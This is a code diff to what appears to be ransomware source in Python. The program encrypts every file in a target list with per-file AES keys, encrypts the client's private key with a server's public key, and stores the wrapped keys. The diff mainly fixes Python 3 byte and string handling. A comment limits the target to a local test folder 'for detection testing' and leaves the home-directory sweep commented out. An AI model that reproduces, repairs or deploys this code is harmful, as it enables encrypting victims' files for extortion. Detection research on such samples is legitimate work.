@@ -49,6 +49,7 @@ def encrypt_priv_key(msg, key):
 def start_encryption(files):
     AES_and_base64_path = []
     for found_file in files:
+        # key = generate_keys.generate_key(32, True)
         key = generate_keys.generate_key(128, True)
         AES_obj = symmetric.AESCipher(key)
         
@@ -67,7 +68,8 @@ def start_encryption(files):
         with open(new_file_name, 'wb') as f:
             f.write(encrypted)
 
-        base64_new_file_name = base64.b64encode(new_file_name)
+        # base64_new_file_name = base64.b64encode(new_file_name)
+        base64_new_file_name = base64.b64encode(new_file_name.encode('utf-8')).decode('utf-8')
 
         AES_and_base64_path.append((key, base64_new_file_name))
     return AES_and_base64_path
@@ -83,7 +85,7 @@ def menu():
 
     # files = get_files.find_files(variables.home)
     # Safely limited call for detection testing:
-    files = get_files.find_files('../files2encrypt')
+    files = get_files.find_files('files2encrypt/')
 
     rsa_object = asymmetric.assymetric()
     rsa_object.generate_keys()
@@ -92,6 +94,9 @@ def menu():
     Client_public_key = rsa_object.public_key_PEM
     encrypted_client_private_key = encrypt_priv_key(Client_private_key,
                                                     variables.server_public_key)
+    
+    #create directory if not existed
+    os.makedirs(os.path.dirname(variables.encrypted_client_private_key_path), exist_ok=True)
     
     with open(variables.encrypted_client_private_key_path, 'wb') as output:
         pickle.dump(encrypted_client_private_key, output, pickle.HIGHEST_PROTOCOL)
@@ -126,7 +131,9 @@ def menu():
 
     with open(variables.aes_encrypted_keys_path, 'w') as f:
         for _ in enc_aes_key_and_base64_path:
-            line = base64.b64encode(_[0]) + " " + _[1] + "\n"
+            
+            # line = base64.b64encode(_[0]) + " " + _[1] + "\n"
+            line = base64.b64encode(_[0]).decode('utf-8') + " " + _[1] + "\n"
             f.write(line)
 
     enc_aes_key_and_base64_path = None
